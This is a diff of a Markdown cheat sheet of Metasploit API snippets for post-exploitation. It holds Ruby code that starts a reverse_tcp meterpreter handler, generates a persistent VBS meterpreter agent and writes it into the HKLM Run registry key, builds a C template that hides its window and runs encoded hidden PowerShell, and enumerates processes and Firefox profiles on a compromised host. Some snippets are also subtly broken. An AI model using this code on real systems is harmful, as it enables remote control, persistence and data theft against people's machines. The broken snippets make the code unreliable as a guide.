@@ -488,30 +488,26 @@ system along with the details like IP, netmask, mac_address etc.
 
 ## LISTTING REMOTE PROCESSES
 
+- **List remote processes**
+'We can access the list of processes from **session.sys.process()** using 'get_processes' method'.
 
+      if listprocesses == TRUE
+        print_status('Process list:')
+          print_line('')
+          session.sys.process.get_processes().each do |x|        
+            print_good("#{x['name']} [#{x['pid']}]")
+          end
+            print_line('') 
+        end
 
+- **List processes (get process by name)**
 
-# List processes
-# We can access the list of processes from “session.sys.process” using “get_processes” method.
-# Print processes if it is requested
-if listprocesses == TRUE
-  print_status('Process list:')
-  print_line('')
-    session.sys.process.get_processes().each do |x|        
-    print_good("#{x['name']} [#{x['pid']}]")    
-    end
-  print_line('') 
-end
-
-
-
-## List processes (get process by name)
-def get_winlogon
-  session.sys.process.get_processes().each do |x|
-    if x['name'].downcase == "winlogon.exe"
-      print_good("process found ..")
-    end
-end
+      def get_winlogon
+        session.sys.process.get_processes().each do |x|
+          if x['name'].downcase == "winlogon.exe"
+        end
+        print_good("process found ..")
+      end
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)
 
@@ -521,56 +517,50 @@ end
 
 ## VARIOUS OPERATIONS
 
+- **store data in loot folder (local)**
 
+      if datastore['STORE_LOOT'] == true
+        data_entry = cmd_exec("ifconfig")
+        store_loot("ifconfig", "text/plain", session, data_entry, "output.txt", "output of ifconfig command")
+      end
 
+- **display report note to attacker**
 
-## store data in loot
-OptBool.new('STORE_LOOT', [false, 'Store file in loot (will simply output file to console if set to false).', true]),
-if datastore['STORE_LOOT'] == true
-  data_entry = cmd_exec("ifconfig")
-  store_loot("ifconfig", "text/plain", session, data_entry, "output.txt", "output of ifconfig command")
-end
+      output = client.fs.file.expand_path("%SYSTEMDRIVE%")
+      report_note(
+        :host_name => session,
+        :type      => "windows.system.path",
+        :data      => output,
+        :update    => :unique_data
+        )
+      print_status("System info gather ..")
 
+- **start a multi handler (local)**
 
+      mul = client.framework.exploits.create("multi/handler")
+      mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
+      mul.datastore['LHOST']     = rhost
+      mul.datastore['LPORT']     = rport
+      mul.datastore['EXITFUNC']  = 'process'
+      mul.datastore['ExitOnSession'] = false
 
-## display report note to attacker???
-output = client.fs.file.expand_path("%SYSTEMDRIVE%")
-report_note(
-  :host_name => session,
-  :type      => "windows.system.path",
-  :data      => output,
-  :update    => :unique_data
-  )
-print_status("System info gather ..")
+      mul.exploit_simple(
+        'Payload'        => mul.datastore['PAYLOAD'],
+        'RunAsJob'       => true
+      )
+      end
 
+- **try to fill a table**
 
-
-## start a handler
-mul = client.framework.exploits.create("multi/handler")
-mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
-mul.datastore['LHOST']     = rhost
-mul.datastore['LPORT']     = rport
-mul.datastore['EXITFUNC']  = 'process'
-mul.datastore['ExitOnSession'] = false
-
-mul.exploit_simple(
-  'Payload'        => mul.datastore['PAYLOAD'],
-  'RunAsJob'       => true
-)
-end
-
-
-
-## try to fill a table ???
-          # building table display
-          tbl = Rex::Ui::Text::Table.new(
-              'Header'  => 'Interfaces Active',
-              'Indent'  => 1,
-              'Columns' =>
-          [
-                      'wlan',
-                      'lan'
-          ])
+      # building table display
+      tbl = Rex::Ui::Text::Table.new(
+        'Header'  => 'Interfaces Active',
+        'Indent'  => 1,
+        'Columns' =>
+      [
+          'wlan',
+          'lan'
+      ])
  
      # Gather target user data
      file1 = client.fs.file.new("%temp%\\dum.txt")
@@ -590,95 +580,89 @@ end
 
 ## WRITING EXPLOITS
 
+- **This is my imaginary exploit in ruby**
 
+      include Msf::Exploit::FILEFORMAT
+      buf = ""
+      buf << "A" * 1024
+      buf << [0x40201f01].pack("V")
+      buf << "\x90" * 10
+      buf << payload.encoded
+      file_create(buf)
 
+- **build vbs script**
 
-## This is my imaginary exploit in ruby
-include Msf::Exploit::FILEFORMAT
-buf = ""
-buf << "A" * 1024
-buf << [0x40201f01].pack("V")
-buf << "\x90" * 10
-buf << payload.encoded
-file_create(buf)
+      print_status("Creating a persistent agent: LHOST=#{rhost} LPORT=#{rport} (interval=#{delay} onboot=#{install})")
+      pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
+      pay.datastore['LHOST'] = rhost
+      pay.datastore['LPORT'] = rport
+      raw  = pay.generate
+      vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw, {:persist => true, :delay => 5})
+      print_status("Persistent agent script is #{vbs.length} bytes long")
 
+- **BUILD C template**
 
-
-## build vbs script
-print_status("Creating a persistent agent: LHOST=#{rhost} LPORT=#{rport} (interval=#{delay} onboot=#{install})")
-pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
-pay.datastore['LHOST'] = rhost
-pay.datastore['LPORT'] = rport
-raw  = pay.generate
-vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw, {:persist => true, :delay => 5})
-print_status("Persistent agent script is #{vbs.length} bytes long")
-
-
-
-## BUILD C template
-exeTEMPLATE = %{
-#include <stdio.h>
-#include <windows.h>
-int shellCode(){
-	system("color 63");
-	system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}"); 
-	/*
-		((Shell Code into the console))
-	*/
+      exeTEMPLATE = %{
+        #include <stdio.h>
+        #include <windows.h>
+          int shellCode(){
+	    system("color 63");
+	    system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}"); 
+	  /*
+            ((Shell Code into the console))
+	  */
 	return 0;
-}
-void hide(){
+        }
+
+      void hide(){
 	HWND stealth;
 	AllocConsole();
 	stealth = FindWindowA("ConsoleWindowClass",NULL);
 	ShowWindow (stealth,0);
-}
-int main(){
+      }
+
+      int main(){
 	hide();
 	shellCode();
 	return 0;
-}
-},
+        }
+      },
 
-# write C template to a file
-file_temp = File.new("temp.c", "w")
-file_temp.write(exeTEMPLATE)
-file_temp.close
+      # write C template to a file
+      file_temp = File.new("temp.c", "w")
+      file_temp.write(exeTEMPLATE)
+      file_temp.close
 
+- **This sample demonstrates how a file can be encoded using a framework encoder.**
 
+      require ’msf/base’
+      $:.unshift(File.join(File.dirname(__FILE__), ’..’, ’..’, ’..’,’lib’))
+      if (ARGV.empty?)
+        print_warning("Usage: #{File.basename(__FILE__)} encoder_name file_name format")
+        return nil
+      end
 
-## This sample demonstrates how a file can be encoded using a framework encoder.
-require ’msf/base’
-$:.unshift(File.join(File.dirname(__FILE__), ’..’, ’..’, ’..’,’lib’))
-if (ARGV.empty?)
-  puts "Usage: #{File.basename(__FILE__)} encoder_name file_name format"
-  return nil
-end
+      framework = Msf::Simple::Framework.create
+        begin
+        # Create the encoder instance.
+        mod = framework.encoders.create(ARGV.shift)
+        Msf::Simple::Buffer.transform(mod.encode(IO.readlines(ARGV.shift).join), ARGV.shift || ’ruby’
+      rescue
+        print_error("Error: #{$!}\n\n#{$@.join("\n")}")
+      end
 
+- **write reg key remote**
 
-
-framework = Msf::Simple::Framework.create
-begin
-  # Create the encoder instance.
-  mod = framework.encoders.create(ARGV.shift)
-  puts(Msf::Simple::Buffer.transform(mod.encode(IO.readlines(ARGV.shift).join), ARGV.shift || ’ruby’))
-  rescue
-  puts "Error: #{$!}\n\n#{$@.join("\n")}"
-end
-
-
-
-## write reg key remote
-nam = Rex::Text.rand_text_alpha(rand(8)+8)
-print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
-  if(key)
-    key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
-    print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-  else
-    print_status("Error: failed to open the registry key for writing")
-  end
-end
+      nam = Rex::Text.rand_text_alpha(rand(8)+8)
+      print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+      key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
+        if(key)
+          key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
+          print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+        else
+          print_status("Error: failed to open the registry key for writing")
+        end
+      end
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)
 
@@ -688,180 +672,174 @@ end
 
 ---
 
-def check_firefox_win(path)
-    paths  = []
-    ffpath = []
-    path   = path + "\\Mozilla\\"
-    print_status("Checking for Firefox profile in: #{path}")
+      def check_firefox_win(path)
+          paths  = []
+          ffpath = []
+          path = path + "\\Mozilla\\"
+      print_status("Checking for Firefox profile in: #{path}")
 
-    stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
-    if !stat
-      print_error("Firefox was not found (Missing profiles.ini)")
-      return
-    end
+      stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
+      if !stat
+        print_error("Firefox was not found (Missing profiles.ini)")
+        return
+      end
 
-    session.fs.dir.foreach(path) do |fdir|
-      #print_status("Found a Firefox directory: #{path + fdir}")
-      ffpath << path + fdir
-      break
-    end
+      session.fs.dir.foreach(path) do |fdir|
+        print_status("Found a Firefox directory: #{path + fdir}")
+        ffpath << path + fdir
+        break
+      end
 
-    if ffpath.empty?
-      print_error("Firefox was not found")
-      return
-    end
+      if ffpath.empty?
+        print_error("Firefox was not found")
+        return
+      end
 
-    #print_status("Locating Firefox profiles")
-    path << "Firefox\\Profiles\\"
+      #print_status("Locating Firefox profiles")
+      path << "Firefox\\Profiles\\"
 
-    # We should only have profiles in the Profiles directory store them all
-    begin
+      # We should only have profiles in the Profiles directory store them all
+      begin
       session.fs.dir.foreach(path) do |pdirs|
         next if pdirs == "." or pdirs == ".."
         vprint_good("Found profile: #{path + pdirs}")
         paths << path + pdirs
       end
-    rescue
-      print_error("Profiles directory is missing")
-      return
-    end
+      rescue
+        print_error("Profiles directory is missing")
+        return
+      end
+      paths.empty? ? (nil) : (paths)
+      end
 
-    paths.empty? ? (nil) : (paths)
-  end
+<br /><br /><br />
 
+> Syntax: client.sys.config.sysinfo["System Language"]
+> Output: "en_US"
+> Comment: This will give operating system language of the compromised system.
 
-
-# --------------------------------------------------------------
-
-
-
-Syntax: client.sys.config.sysinfo["System Language"]
-Output: "en_US"
-Comment: This will give operating system language of the compromised system.
------------
-REG QUERY HKLM\System\CurrentControlSet\Control\Nls\Language /v InstallLanguage
-0436 = "af;Afrikaans"
-041C = "sq;Albanian"
-0001 = "ar;Arabic"
-0401 = "ar-sa;Arabic (Saudi Arabia)"
-0801 = "ar-iq;Arabic (Iraq)"
-0C01 = "ar-eg;Arabic (Egypt)"
-1001 = "ar-ly;Arabic (Libya)"
-1401 = "ar-dz;Arabic (Algeria)"
-1801 = "ar-ma;Arabic (Morocco)"
-1C01 = "ar-tn;Arabic (Tunisia)"
-2001 = "ar-om;Arabic (Oman)"
-2401 = "ar-ye;Arabic (Yemen)"
-2801 = "ar-sy;Arabic (Syria)"
-2C01 = "ar-jo;Arabic (Jordan)"
-3001 = "ar-lb;Arabic (Lebanon)"
-3401 = "ar-kw;Arabic (Kuwait)"
-3801 = "ar-ae;Arabic (you.A.E.)"
-3C01 = "ar-bh;Arabic (Bahrain)"
-4001 = "ar-qa;Arabic (Qatar)"
-042D = "eu;Basque"
-0402 = "bg;Bulgarian"
-0423 = "be;Belarusian"
-0403 = "ca;Catalan"
-0004 = "zh;Chinese"
-0404 = "zh-tw;Chinese (Taiwan)"
-0804 = "zh-cn;Chinese (China)"
-0C04 = "zh-hk;Chinese (Hong Kong SAR)"
-1004 = "zh-sg;Chinese (Singapore)"
-041A = "hr;Croatian"
-0405 = "cs;Czech"
-0406 = "the;Danish"
-0413 = "nl;Dutch (Netherlands)"
-0813 = "nl-be;Dutch (Belgium)"
-0009 = "en;English"
-0409 = "en-us;English (United States)"
-0809 = "en-gb;English (United Kingdom)"
-0C09 = "en-au;English (Australia)"
-1009 = "en-ca;English (Canada)"
-1409 = "en-nz;English (New Zealand)"
-1809 = "en-ie;English (Ireland)"
-1C09 = "en-za;English (South Africa)"
-2009 = "en-jm;English (Jamaica)"
-2809 = "en-bz;English (Belize)"
-2C09 = "en-tt;English (Trinidad)"
-0425 = "et;Estonian"
-0438 = "fo;Faeroese"
-0429 = "fa;Farsi"
-040B = "fi;Finnish"
-040C = "fr;French (France)"
-080C = "fr-be;French (Belgium)"
-0C0C = "fr-ca;French (Canada)"
-100C = "fr-ch;French (Switzerland)"
-140C = "fr-lu;French (Luxembourg)"
-043C = "gd;Gaelic"
-0407 = "de;German (Germany)"
-0807 = "de-ch;German (Switzerland)"
-0C07 = "de-at;German (Austria)"
-1007 = "de-lu;German (Luxembourg)"
-1407 = "de-li;German (Liechtenstein)"
-0408 = "el;Greek"
-040D = "he;Hebrew"
-0439 = "hi;Hindi"
-040E = "hu;Hungarian"
-040F = "is;Icelandic"
-0421 = "in;Indonesian"
-0410 = "it;Italian (Italy)"
-0810 = "it-ch;Italian (Switzerland)"
-0411 = "ja;Japanese"
-0412 = "ko;Korean"
-0426 = "lv;Latvian"
-0427 = "lt;Lithuanian"
-042F = "mk;FYRO Macedonian"
-043E = "ms;Malay (Malaysia)"
-043A = "mt;Maltese" 0414 = "no;Norwegian (Bokmal)"
-0814 = "no;Norwegian (Nynorsk)"
-0415 = "pl;Polish"
-0416 = "pt-br;Portuguese (Brazil)"
-0816 = "pt;Portuguese (Portugal)"
-0417 = "rm;Rhaeto-Romanic"
-0418 = "ro;Romanian"
-0818 = "ro-mo;Romanian (Moldova)"
-0419 = "ru;Russian"
-0819 = "ru-mo;Russian (Moldova)"
-0C1A = "sr;Serbian (Cyrillic)"
-081A = "sr;Serbian (Latin)"
-041B = "sk;Slovak"
-0424 = "sl;Slovenian"
-042E = "sb;Sorbian"
-040A = "es;Spanish (Traditional Sort)"
-080A = "es-mx;Spanish (Mexico)"
-0C0A = "es;Spanish (International Sort)"
-100A = "es-gt;Spanish (Guatemala)"
-140A = "es-cr;Spanish (Costa Rica)"
-180A = "es-pa;Spanish (Panama)"
-1C0A = "es-do;Spanish (Dominican Republic)"
-200A = "es-ve;Spanish (Venezuela)"
-240A = "es-co;Spanish (Colombia)"
-280A = "es-pe;Spanish (Peru)"
-2C0A = "es-ar;Spanish (Argentina)"
-300A = "es-ec;Spanish (Ecuador)"
-340A = "es-cl;Spanish (Chile)"
-380A = "es-uy;Spanish (Uruguay)"
-3C0A = "es-py;Spanish (Paraguay)"
-400A = "es-bo;Spanish (Bolivia)"
-440A = "es-sv;Spanish (El Salvador)"
-480A = "es-hn;Spanish (Honduras)"
-4C0A = "es-ni;Spanish (Nicaragua)"
-500A = "es-pr;Spanish (Puerto Rico)"
-0430 = "sx;Sutu"
-041D = "sv;Swedish"
-081D = "sv-fi;Swedish (Finland)"
-041E = "th;Thai"
-0431 = "ts;Tsonga"
-0432 = "tn;Tswana"
-041F = "tr;Turkish"
-0422 = "uk;Ukrainian"
-0420 = "your;Urdu"
-042A = "vi;Vietnamese"
-0434 = "xh;Xhosa"
-043D = "ji;Yiddish"
-0435 = "zu;Zulu"
------------
+      REG QUERY HKLM\System\CurrentControlSet\Control\Nls\Language /v InstallLanguage
+      0436 = "af;Afrikaans"
+      041C = "sq;Albanian"
+      0001 = "ar;Arabic"
+      0401 = "ar-sa;Arabic (Saudi Arabia)"
+      0801 = "ar-iq;Arabic (Iraq)"
+      0C01 = "ar-eg;Arabic (Egypt)"
+      1001 = "ar-ly;Arabic (Libya)"
+      1401 = "ar-dz;Arabic (Algeria)"
+      1801 = "ar-ma;Arabic (Morocco)"
+      1C01 = "ar-tn;Arabic (Tunisia)"
+      2001 = "ar-om;Arabic (Oman)"
+      2401 = "ar-ye;Arabic (Yemen)"
+      2801 = "ar-sy;Arabic (Syria)"
+      2C01 = "ar-jo;Arabic (Jordan)"
+      3001 = "ar-lb;Arabic (Lebanon)"
+      3401 = "ar-kw;Arabic (Kuwait)"
+      3801 = "ar-ae;Arabic (you.A.E.)"
+      3C01 = "ar-bh;Arabic (Bahrain)"
+      4001 = "ar-qa;Arabic (Qatar)"
+      042D = "eu;Basque"
+      0402 = "bg;Bulgarian"
+      0423 = "be;Belarusian"
+      0403 = "ca;Catalan"
+      0004 = "zh;Chinese"
+      0404 = "zh-tw;Chinese (Taiwan)"
+      0804 = "zh-cn;Chinese (China)"
+      0C04 = "zh-hk;Chinese (Hong Kong SAR)"
+      1004 = "zh-sg;Chinese (Singapore)"
+      041A = "hr;Croatian"
+      0405 = "cs;Czech"
+      0406 = "the;Danish"
+      0413 = "nl;Dutch (Netherlands)"
+      0813 = "nl-be;Dutch (Belgium)"
+      0009 = "en;English"
+      0409 = "en-us;English (United States)"
+      0809 = "en-gb;English (United Kingdom)"
+      0C09 = "en-au;English (Australia)"
+      1009 = "en-ca;English (Canada)"
+      1409 = "en-nz;English (New Zealand)"
+      1809 = "en-ie;English (Ireland)"
+      1C09 = "en-za;English (South Africa)"
+      2009 = "en-jm;English (Jamaica)"
+      2809 = "en-bz;English (Belize)"
+      2C09 = "en-tt;English (Trinidad)"
+      0425 = "et;Estonian"
+      0438 = "fo;Faeroese"
+      0429 = "fa;Farsi"
+      040B = "fi;Finnish"
+      040C = "fr;French (France)"
+      080C = "fr-be;French (Belgium)"
+      0C0C = "fr-ca;French (Canada)"
+      100C = "fr-ch;French (Switzerland)"
+      140C = "fr-lu;French (Luxembourg)"
+      043C = "gd;Gaelic"
+      0407 = "de;German (Germany)"
+      0807 = "de-ch;German (Switzerland)"
+      0C07 = "de-at;German (Austria)"
+      1007 = "de-lu;German (Luxembourg)"
+      1407 = "de-li;German (Liechtenstein)"
+      0408 = "el;Greek"
+      040D = "he;Hebrew"
+      0439 = "hi;Hindi"
+      040E = "hu;Hungarian"
+      040F = "is;Icelandic"
+      0421 = "in;Indonesian"
+      0410 = "it;Italian (Italy)"
+      0810 = "it-ch;Italian (Switzerland)"
+      0411 = "ja;Japanese"
+      0412 = "ko;Korean"
+      0426 = "lv;Latvian"
+      0427 = "lt;Lithuanian"
+      042F = "mk;FYRO Macedonian"
+      043E = "ms;Malay (Malaysia)"
+      043A = "mt;Maltese" 0414 = "no;Norwegian (Bokmal)"
+      0814 = "no;Norwegian (Nynorsk)"
+      0415 = "pl;Polish"
+      0416 = "pt-br;Portuguese (Brazil)"
+      0816 = "pt;Portuguese (Portugal)"
+      0417 = "rm;Rhaeto-Romanic"
+      0418 = "ro;Romanian"
+      0818 = "ro-mo;Romanian (Moldova)"
+      0419 = "ru;Russian"
+      0819 = "ru-mo;Russian (Moldova)"
+      0C1A = "sr;Serbian (Cyrillic)"
+      081A = "sr;Serbian (Latin)"
+      041B = "sk;Slovak"
+      0424 = "sl;Slovenian"
+      042E = "sb;Sorbian"
+      040A = "es;Spanish (Traditional Sort)"
+      080A = "es-mx;Spanish (Mexico)"
+      0C0A = "es;Spanish (International Sort)"
+      100A = "es-gt;Spanish (Guatemala)"
+      140A = "es-cr;Spanish (Costa Rica)"
+      180A = "es-pa;Spanish (Panama)"
+      1C0A = "es-do;Spanish (Dominican Republic)"
+      200A = "es-ve;Spanish (Venezuela)"
+      240A = "es-co;Spanish (Colombia)"
+      280A = "es-pe;Spanish (Peru)"
+      2C0A = "es-ar;Spanish (Argentina)"
+      300A = "es-ec;Spanish (Ecuador)"
+      340A = "es-cl;Spanish (Chile)"
+      380A = "es-uy;Spanish (Uruguay)"
+      3C0A = "es-py;Spanish (Paraguay)"
+      400A = "es-bo;Spanish (Bolivia)"
+      440A = "es-sv;Spanish (El Salvador)"
+      480A = "es-hn;Spanish (Honduras)"
+      4C0A = "es-ni;Spanish (Nicaragua)"
+      500A = "es-pr;Spanish (Puerto Rico)"
+      0430 = "sx;Sutu"
+      041D = "sv;Swedish"
+      081D = "sv-fi;Swedish (Finland)"
+      041E = "th;Thai"
+      0431 = "ts;Tsonga"
+      0432 = "tn;Tswana"
+      041F = "tr;Turkish"
+      0422 = "uk;Ukrainian"
+      0420 = "your;Urdu"
+      042A = "vi;Vietnamese"
+      0434 = "xh;Xhosa"
+      043D = "ji;Yiddish"
+      0435 = "zu;Zulu"
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)
 
